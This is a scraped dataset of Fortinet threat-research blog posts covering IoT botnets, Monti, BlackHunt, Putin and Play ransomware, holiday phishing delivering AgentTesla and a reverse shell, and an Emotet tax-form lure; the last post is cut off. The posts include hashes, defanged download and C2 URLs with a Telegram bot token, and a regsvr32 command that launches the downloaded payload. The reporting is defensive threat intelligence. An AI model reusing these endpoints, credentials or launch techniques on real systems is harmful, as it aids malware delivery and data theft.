attacks. This botnet is named Rose, based on the source code previously hosted on GitHub. Interestingly, the bot configures ZTE and Huawei devices to prevent their exploitation, similar to the Mozi botnetreportedby Microsoft. We also came across a simple DDoS bot that calls itself “nyancat” (Figure 11), as seen in the path of the source files used to compile the binary. The path also suggests that the bot was compiled in a Windows environment. This bot extends publicly available botnet code on GitHub to perform HTTP-based Denial of Service (DoS) types of attacks on top of existing TCP, UDP, and Valve Source Engine (VSE) attacks. Interestingly, we found another DDoS botnet also compiled in Windows from the same source file base path (Figure 12),C:/Users/Admin/Music. This botnet also looks like an adaptation of another source code on GitHub that supportsHTTP GET, HULK, GoldenEye,TLS and basic TCP and UDP types of DoS attacks (Figure 13). It’s possible that these two samples were compiled by the same threat actor, given that the binaries were built from source code located in similar directories on Windows machines and that some of the functions share similar names and code. Another malware we captured is Panchan (Figure 14), a Golang-based XMRig miner that wasdocumentedby Akamai around June 2022 but with earlier samples found as early as March. IoT malware is very much alive and continues to exploit both old and new vulnerabilities to infect devices and propagate themselves. While most of them target router vulnerabilities, there are notable exceptions, like the popular F5 BIG-IP iControl CVE-2022-1388 and VMware Workspace ONE Access CVE-2022-22954 vulnerabilities. Data from our telemetry also verifies that even old vulnerabilities from 2014 are still being actively exploited. Mirai and Gafgyt-based malware still dominate the IoT threat landscape in terms of the sheer volume of samples. There is also a growing variety of malware written in the Go programming language, possibly fueled by the increasing availability of malware source code in public repositories like GitHub, which makes it easy for unsophisticated threat actors to build and operate their own botnets. With this increased interest in using Golang for malware development, we expect to see even more Golang IoT botnets this year. FortiGuard Labs will continue to track and report on emerging threats and trends in the IoT threat landscape. The FortiGuard Antivirus service detects and blocks these threats as TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. FortiGuard Labs provides IPS signatures against the following vulnerabilities. TheFortiGuard Web FilteringService blocks the C2 servers and download URLs cited in this report. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that work together to provide up-to-date threat intelligence about hostile sources. 8332871673d8e9d90c95a463e1bdc73b1fae1a59b46767cab1c0c9257de4e7f5 ebe891df3802d21c34d1821c5c772d77de4c6e71eb84690ec19aecb923a95aca fd47e446e72d7eb6e75f4990c192559c349b92f60fa6f57508fde646cf8317aa 51f45d81f00e65a29b02231e5eba7ac850094fa00172668daf439d28d544717e 038271675df68c56ce147852093fcb795cbde55198d33f4be52d6d102689764d 56ab2c3f334f73b986c64180d5c82d4050a583ff06da0873ff4750be4a02bbaf 8dceacda8288e61769a9ccf6900dff45d500679440b006138d4746ebf15cc664 e2c2a0cccefc4314c110f3c0b887e5008073e607c61e1adde5000efb8e630d50 1c1817e9c32dcf70871505a39d235d0f424f985d13998706ed0ed6aaffc20da6 b4cd314c832f046143d200285dd1fb96f1f7443bc0e3d321614225bf77783160 5f73c66e72118cb2d18ff839e9f94d1d0e1da44a5c76a0972c537652eacf708b Download URLs hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 176[.]65[.]137[.]5 194[.]87[.]84[.]154 threat research,FortiGuards Labs,Internet of Things (IoT),botnet,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/2022-iot-threat-review",
      "scraped_at": "2025-07-20T14:01:46.741800",
      "indicators": {
        "ip_address": [],
        "domain": [
          "IG-IP"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b4cd314c832f046143d200285dd1fb96f1f7443bc0e3d321614225bf77783160",
          "5f73c66e72118cb2d18ff839e9f94d1d0e1da44a5c76a0972c537652eacf708b",
          "ebe891df3802d21c34d1821c5c772d77de4c6e71eb84690ec19aecb923a95aca",
          "8dceacda8288e61769a9ccf6900dff45d500679440b006138d4746ebf15cc664",
          "56ab2c3f334f73b986c64180d5c82d4050a583ff06da0873ff4750be4a02bbaf",
          "fd47e446e72d7eb6e75f4990c192559c349b92f60fa6f57508fde646cf8317aa",
          "e2c2a0cccefc4314c110f3c0b887e5008073e607c61e1adde5000efb8e630d50",
          "038271675df68c56ce147852093fcb795cbde55198d33f4be52d6d102689764d",
          "8332871673d8e9d90c95a463e1bdc73b1fae1a59b46767cab1c0c9257de4e7f5",
          "51f45d81f00e65a29b02231e5eba7ac850094fa00172668daf439d28d544717e",
          "1c1817e9c32dcf70871505a39d235d0f424f985d13998706ed0ed6aaffc20da6"
        ],
        "cve": [
          "CVE-2022-22954",
          "CVE-2017-17215",
          "CVE-2022-1388",
          "CVE-2014-8361"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.8043626448534424
    }
  },
  {
    "id": "Fortinet_6409",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Monti, BlackHunt, and Putin",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and across the OSINT community. The Ransomware Roundup report provides brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Monti, BlackHunt, and Putin ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Monti is a relatively new ransomware designed to encrypt files on Linux systems. Files encrypted by Monti ransomware have a \".puuuk” file extension. We are also aware of reports of potential Monti variants that work on Windows systems. Monti drops a ransom note titled “README.txt”. This ransom note resembles that of the infamous Conti ransomware. Unlike typical ransomware, the Monti threat actor operates two separate TOR sites: one for hosting data stolen from victims and another for ransom negotiation. At the time of writing, the ransom negotiation site was not accessible. Thedata leaksite has a “wall of shame,” which the Monti operator may have copied from other ransomware gangs such as Ragnar Locker. Currently, the leak site does not list any victims but has a provocative message that may indicate that many victims of Monti ransomware were “cooperative” and paid ransom, except for one victim in Argentina. The ransomware also drops a text file titled “result.txt”, which shows how many files it has encrypted in the compromised machine. FortiGuard Labs recently came across new variants of the BlackHunt ransomware. This ransomware is relatively new and reportedly accesses victims’ networks through vulnerable Remote Desktop Protocol (RDP) configurations. Files encrypted by BlackHunt ransomware can be identified with the following filename pattern: [unique ID assigned to each compromised machine].[contact email address]. Black. The ransomware also deletes shadow copies, which makes file recovery difficult. The ransomware also drops two ransom notes: one is titled “#BlackHunt_ReadMe.hta” and the other is “#BlackHunt_ReadMe.txt”. Although both ransom notes belong to BlackHunt ransomware, the notes not only include different contact email addresses but the different IDs assigned to each victim as well. The ransom note in HTA format also has a link to a TOR site, which was no longer accessible at the time of the investigation. Putin is a recent ransomware that encrypts files on victims’ machines. It then tries to extort money for decrypting those files and not leaking stolen data to the public. Files encrypted by Putin ransomware have a “. PUTIN” file extension. The ransomware drops a ransom note titled “README.txt”, which states that victims have only two days to make a ransom payment. Otherwise, their encrypted files will not be recovered. This is a common tactic used by many ransomware variants to put pressure on victims to pay a ransom as fast as possible. The ransom note includes two Telegram channels: one for negotiating ransom payment with the Putin ransomware gang and another for releasing data stolen from the victims. At the time of the investigation, the channel used for data leaks lists a Singapore and a Spanish company. However, the dates of the posts only go back to late November 2022, indicating that the Putin ransomware is likely not yet widespread. Fortinet customers are already protected from this malware variant through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Monti, BlackHunt and Putin ransomware variants with the following AV signatures: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Protection,ransomware,Ransomware Roundup,ransomware prevention,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-monti-blackhunt-and-more",
      "scraped_at": "2025-07-20T14:01:55.546682",
      "indicators": {
        "ip_address": [],
        "domain": [
          "esult",
          "EADME"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5512572533849129
    }
  },
  {
    "id": "Fortinet_57836",
    "source": "Fortinet",
    "title": "Trying to Steal Christmas (Again!)",
    "text": "FortiGuard Labs Threat Research Much of the world’s population observes and celebrates Christmas every December to connect with friends and family and reflect on the year. Malware operators also observe the holiday, perennially attempting to compromise the systems of users who have let their guard down during the festivities. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Malware opens a backdoor and exfiltrates information from compromised machinesSeverity Level:High FortiGuard Labshas come across two holiday-themed phishing examples that exploit people’s interests in the holidays, leading to malware infection and further exploitation. FortiGuard Labs found that an AgentTesla affiliate started Christmas activities early this year. Their email is disguised to look like it came from a jewelry shop in Dubai. It was sent to a company that specializes in water treatment in Chile. The email requests that the recipient provide quotes for the price and availability of jewelry for Christmas. An obvious red flag is that “Dubai” is spelled wrong (besides asking a company specializing in water treatment for jewelry pricing.) The email has two attachments: “new designs.gz” contains “new designs.exe,” and “Inquiry lists.gz” contains “Inquiry lists.exe.” Although the embedded files have different names, they share the same file hash (SHA2: c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5). When executed, c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5 drops fkkvzetzm.exe, jfwxswcu.au3, igqyivch.prc, and kywyozha.x into the %usertemp% directory. It then calls an AutoIt script (jfwxswcu.au3) by launching fkkvzetzm.exe (a legitimate copy ofAutoIt3) with jfwxswcu.au3 as an argument. The file jfwxswcu.au3 is an obfuscated AutoIt script designed to read and deobfuscate igqyivch.prc, which contains shellcode. The shellcode is then loaded into memory via VirtualAlloc. The shellcode, in turn, loads kywyozha.x into memory. Once loaded, kywyozha.x performs several tasks, including launching a copy of the running process and checking to see if it’s running inside a 64bit process. To avoid being detected by system monitors such as AV and EDR, it copies ntdll.dll into memory so it can use that instead of the one on the disk. It then checks to see if specific APIs in ntdll.dll have been modified or hooked withtrampolines. It then finally injects kywyozha.x into the copy of the running process. The file kywyozha.x is an executable file. It calls itself 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe (SHA2: 0FCAE5DB73D10B022E86F7E0799073623FA5063A29054807E1F93A4016D8FC99). 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe is a variant of the AgentTesla infostealer Trojan that uses Telegram (hxxps://api.telegram[.]org/bot5018340186:AAFKw8ktzY7O_6e1fhgEWq27H2aE-rsBGjA/) for its Command-and-Control (C2) server. The malware can download and delete files, steal credentials from browsers and FTP and email applications, and performkeylogging Fortunately, the company that received the email is not in the jewelry business and is unlikely to have opened and executed AgentTesla. We also recently came across a strange email with a theme familiar to Christmas movie viewers. The email was crafted to appear as being sent from Klaus Hans Gruber to John McClane - fictional characters from the original Die Hard movie. The email has a heartfelt message requesting to settle their long-time feud and asks the recipient (in this case John McClane) to open the attachment, “good_time.zip.” The archive file contains a series of what appear to be JPEG image files. However, a closer look revealed that “image6” is not actually a JPEG file. Rather than a photo, image6 is a batch file that displays “image7.jpg.jpg” (shown below) and also loads and executes PowerShell code from hxxps://pastebin[.]com/raw/PeJLUFC4. While these PowerShell commands claim to be for “educational purposes,” they create a reverse shell backdoor to the email sender. This backdoor allows for the execution of arbitrary PowerShell commands. The obvious tactic used by the attacker is to get the recipient to go through a set of amusing images attached to the email and inadvertently run the malicious batch file. While the email is crafted as a joke, the attachment can still cause real harm to users by opening a backdoor on compromised machines. While the attacks covered in this blog are not new by any means, such attacks are repeated every year because threat actors believe that “if you take enough shots, you will eventually make a basket.” That’s especially true when attacks exploit things like holidays and major events, like Christmas or the World Cup. Taking advantage of distracted recipients continues to be a successful strategy, and users are cautioned to remain vigilant during the holiday season. To that end, the Cybersecurity and Infrastructure Security Agency (CISA) has created several tips to help users with online safety and handling email attachments. FortiGuard Labs wishes everyone a safe holiday season! The Fortinet Antivirus engine detects all binaries discussed in this blog using the following AV signatures: The FortiGuard Web Filtering service rates the AgentTesla C2 server and the location where malicious PowerShell script is hosted as ‘Malicious’ and blocks them accordingly. FortiMail and FortiSandbox can detect and quarantine the malicious attachments in this campaign, and Fortinet’s CDR (Content Disarm and Reconstruction) service can disable them. In addition to these protections, Fortinet can help train users to understand and detect phishing threats: Our FREENSE trainingprogram—NSE 1 – Information Security Awareness—includes a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. threat research,FortiGuards Labs,email threats,holiday FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/trying-to-steal-christmas-again",
      "scraped_at": "2025-07-20T14:02:03.724998",
      "indicators": {
        "ip_address": [],
        "domain": [
          "gqyivch",
          "pi",
          "mage7",
          "esigns",
          "ists",
          "kkvzetzm",
          "845e90c-374f-4f68-a7a8-4bc7bad7be20",
          "tdll"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5",
          "0FCAE5DB73D10B022E86F7E0799073623FA5063A29054807E1F93A4016D8FC99"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5191873589164787
    }
  },
  {
    "id": "Fortinet_30697",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Play",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Play ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Play is a relative newcomer to the ransomware game, having been detected for the first time in June 2022. In this report, Play refers to both the group developing and distributing it and the name of the ransomware executable. Like many other operators in this space, Play has adopted the double-extortion methodology of encrypting endpoints and/or other infrastructure of value within an organization and then threatening to release exfiltrated data from those machines on the internet if a ransom is not paid. Play has been seen to use a number of common methods to gain access to an environment, including phishing, valid compromised accounts, and exposed RDP (Remote Desktop Protocol) servers. Once a beachhead has been established, LOLBINS (Living Off the Land Binaries) are used to explore and then prepare the ground to execute malware on machines of interest. The ransomware executable is Microsoft Visual C++ based and contains several anti-debugging and anti-analysis features to slow investigations into the activity of the malware. These features include garbage code (untethered instructions that serve no useful purpose) and function returns that drive execution into a dead end. When launched, the ransomware encrypts all files of interest, such as personal and operational documents (it does not touch system files), and leaves them with a “. PLAY” extension. When encryption is complete, a ransom note named “ReadMe.txt” is added to the root of the primary drive (e.g., C:\\). This note contains a link to the group’s TOR pages and a contact e-mail address. The “Play News” landing page lists the companies allegedly impacted by Play and a countdown to the possible release of any data gathered by them. Organizations that have refused to pay also have links to their data posted here. There is also a contact portal where the group can be reached, an “FAQ” section that broadly describes what the group has done, and steps for victims to take to restore their data. As of this writing, the “Play News” page lists seven active victims currently being threatened. The regional breakdown of the victims is below: The regional breakdown of victims whose stolen data was leaked is as follows: Based on this information, the Play ransomware threat actors appear to target victims regardless of their region. The one caveat is that enterprises in former Soviet states do not appear to be listed on “Play News”, although this may be coincidental. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Play ransomware variants with the following AV signatures: File-based IOCs: f18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f e641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0 608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934 006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55 e4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b 8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22 5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5 f6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408 7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0 dcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087 f5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0 3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69 dd101db5d9503f33a0c23d79da3642e999375748f7c1532e98c813b114bdfa1a 47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57 703075181922eb8db8d23279eaed8f7263dfa2b64383cff675da4cedc2394af5 f39d6741cbb99a81decbe5e75c07e846b5a36b40bc1bb0c0c61415300cc43b6c 8d94028bfaac5bef84c56b01f40e429ae4cdf799b2b755dfba9eee3b72448b5b f0a3047e9d557e2150501e302d5e96a1c2669858fb0072f97024fe0dd07d5271 8556dfe5582a5647a5e96cd77e6239874504a01a9c7b9e512e70329ec6f61aea 5e94626c6bcb825acede3826811ed693644d6dbb7caeeefb8575c2ec711a65a6 a29e20d89e8c933e05b690b2779f82716fb31f688594b99d868e4382058caa8f 757524b09e5d4f2399172c4ac0f6996ec34dec90110542973d438d5370aff280 3a36e917a4a6587290a393d5b10d0bd42f99cf0c72a2e7de751a4bfaeb9d30c5 92f3abed62d710064a19f2a50c4482cd02adfd821ace4c2f3030f96290166189 157c43a3a4e014827e42cf4dd20cc8efa71cdf098f5d1d04b6cd1a972d6a8c7a 5eca08ddca898427de5ab13fedf25426102c3a0621d086b63f2e37d2d04ba3e9 2b4111121fb35b46665c42e3ea2cf1b8eda5afce580e310465cb259bb1abd053 12d1a0dc37d877dbf81bd18e8bd57b2843cc254c9a3cfcbecb70305612e60cae bb51255ec929ae1fb34981b8b988769027ee49e68c0958a4a2a76b59a0dc1cff 51f44e31b0f3718a5d145a1f77fd79cbd7ff21fecf8bba3181fea019b508cfeb 73e19be4da76bb4e52cb82493c75690977fc3a5f589a9b47e834362545ef512a bbd84d10f6a56bfeca23fd5d11d9e370fdfa91be73aa60c9d460b2671145c109 0ed328af77f2576071bfd543938fc01101daac01f216dc43bc091a8da4aff18d f054f373cead893f868fd9b4acc24f751afefbb80cf961e305f97741f952a641 176476f9d924d83343a51a90ade097d12b7594dc5dbca1771c440047dfbe81eb 957a6aee2437a5c4d31372af2f6bceb29e1c7a49d650fe207cefc624bf6bca82 2e9126dfad03bdaf54f9b29ade42038c83f65ac7288376f45768901660f62d7b 2ab190542c3ec7b2b6e6d4bccce4c5d6a572f98c6bc89b014fea0c8fd6db6723 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-play-ransomware",
      "scraped_at": "2025-07-20T14:02:12.129871",
      "indicators": {
        "ip_address": [],
        "domain": [
          "eadMe"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "51f44e31b0f3718a5d145a1f77fd79cbd7ff21fecf8bba3181fea019b508cfeb",
          "8d94028bfaac5bef84c56b01f40e429ae4cdf799b2b755dfba9eee3b72448b5b",
          "176476f9d924d83343a51a90ade097d12b7594dc5dbca1771c440047dfbe81eb",
          "3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69",
          "7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0",
          "2ab190542c3ec7b2b6e6d4bccce4c5d6a572f98c6bc89b014fea0c8fd6db6723",
          "f054f373cead893f868fd9b4acc24f751afefbb80cf961e305f97741f952a641",
          "f5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0",
          "5eca08ddca898427de5ab13fedf25426102c3a0621d086b63f2e37d2d04ba3e9",
          "e641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0",
          "dd101db5d9503f33a0c23d79da3642e999375748f7c1532e98c813b114bdfa1a",
          "47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57",
          "8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22",
          "757524b09e5d4f2399172c4ac0f6996ec34dec90110542973d438d5370aff280",
          "5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5",
          "8556dfe5582a5647a5e96cd77e6239874504a01a9c7b9e512e70329ec6f61aea",
          "f6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408",
          "12d1a0dc37d877dbf81bd18e8bd57b2843cc254c9a3cfcbecb70305612e60cae",
          "703075181922eb8db8d23279eaed8f7263dfa2b64383cff675da4cedc2394af5",
          "73e19be4da76bb4e52cb82493c75690977fc3a5f589a9b47e834362545ef512a",
          "bbd84d10f6a56bfeca23fd5d11d9e370fdfa91be73aa60c9d460b2671145c109",
          "f18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f",
          "957a6aee2437a5c4d31372af2f6bceb29e1c7a49d650fe207cefc624bf6bca82",
          "bb51255ec929ae1fb34981b8b988769027ee49e68c0958a4a2a76b59a0dc1cff",
          "3a36e917a4a6587290a393d5b10d0bd42f99cf0c72a2e7de751a4bfaeb9d30c5",
          "006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55",
          "f39d6741cbb99a81decbe5e75c07e846b5a36b40bc1bb0c0c61415300cc43b6c",
          "2e9126dfad03bdaf54f9b29ade42038c83f65ac7288376f45768901660f62d7b",
          "a29e20d89e8c933e05b690b2779f82716fb31f688594b99d868e4382058caa8f",
          "608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934",
          "5e94626c6bcb825acede3826811ed693644d6dbb7caeeefb8575c2ec711a65a6",
          "157c43a3a4e014827e42cf4dd20cc8efa71cdf098f5d1d04b6cd1a972d6a8c7a",
          "f0a3047e9d557e2150501e302d5e96a1c2669858fb0072f97024fe0dd07d5271",
          "dcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087",
          "92f3abed62d710064a19f2a50c4482cd02adfd821ace4c2f3030f96290166189",
          "2b4111121fb35b46665c42e3ea2cf1b8eda5afce580e310465cb259bb1abd053",
          "0ed328af77f2576071bfd543938fc01101daac01f216dc43bc091a8da4aff18d",
          "e4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 1.143984220907298
    }
  },
  {
    "id": "Fortinet_29992",
    "source": "Fortinet",
    "title": "The Taxman Never Sleeps",
    "text": "FortiGuard Labs Threat Research For most people, taxes are a certainty. In the United States and Canada, tax forms are usually submitted by individuals and businesses in the spring (although, due to COVID,extensions were grantedfor anyone that asked for them). So, our interest was piqued when we came across an e-mail that included a tax form seemingly from the United States Internal Revenue Service (IRS) in early November. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The e-mailFortiGuard Labsdiscovered was, unsurprisingly, malicious. But whatwasinteresting was that it had been sent by the recently resurgent Emotet group. Emotet (aka, Geodo and Heodo) began life as a banking Trojan but has since morphed into a jack-of-all-trades tool that can exploit several vulnerabilities to compromise its victims. Once it has infected a system, it then typically delivers additional payloads. And because it’s modular, it is easily customizable by its users. This flexibility and resiliency are part of why Emotet has managed to survive at least one coordinated industry/law enforcement takedown in 2021. Although claiming to be from “IRS.gov,” this phishing e-mail originated from an organization’s compromised e-mail account in Pakistan. The subject and body claim that the recipient’s IRS K-1 forms are attached in a Zip archive encrypted with the password “0440”. Schedule K-1is a US federal tax document that reports income, losses, and dividends for a business or financial entity's partners or an S corporation's shareholders to the IRS. Because the content from these forms must be added to an individual’s annual tax form, they must be submitted one month prior (March 15) to the individual income tax submission deadline of April 15. This is why seeing a Schedule K-1 form attached to an email on November 8th was a red flag. A Zip archive, “K-1 form.zip”, and an image of the IRS logo are attached to the email. This “K-1 form.zip” file is an encrypted Zip archive that requires a password to unpack. Its password, “0440”, is included in the body of the e-mail. It allows the “K-1 form.xls” to be opened. Once opened, the file is an Excel spreadsheet with an interesting banner. It exhorts the user “in accordance with the requirements of your security policy” to copy the file into the “Templates” directory of whichever version of Microsoft Office is being used and then relaunching the file. The file has several worksheets (seven in total). Six of those sheets are protected, so they can’t be changed, and the user cannot view their contents directly. As you might suspect, this spreadsheet includes a malicious Excel 4.0 macro. An entry in “Manage Names”—“Excel_BuiltIn_Auto_Open”—is set to execute a command in a cell in the only sheet in the workbook that isn’t protected. A deeper look at Sheet6 shows that column “G” has been hidden. Python scripting reveals more information about how this malicious file functions. Using the Python library “openpyxl”, we could view details hidden in each of the worksheets. As shown inFigure 6, several rows and columns have hidden content. For example, by drilling deeper into the data for “Sheet4,” several URL fragments are revealed. Some further scripting helps piece these fragments together. This reveals four possible download locations for the next stage payload. Depending on which URL is used, the downloaded payload is saved as oxnv1.ooccxx through oxnv4.oocccxx. It then calls and attempts to launch this payload via “regsvr32.exe” using the command “C:\\Windows\\System32\\regsvr32.exe /S ..\\oxnv[n].ooccxx”. This executable is Emotet. The Emotet payload is a Windows Dynamic Link Library (DLL) file. Our analysis shows that it was compiled just before the email for this campaign was sent out. Unusually, this DLL has over 270 export functions! As can be seen in Figure 11, the function names are randomized. The vast majority offer a return to the caller. This appears to be an 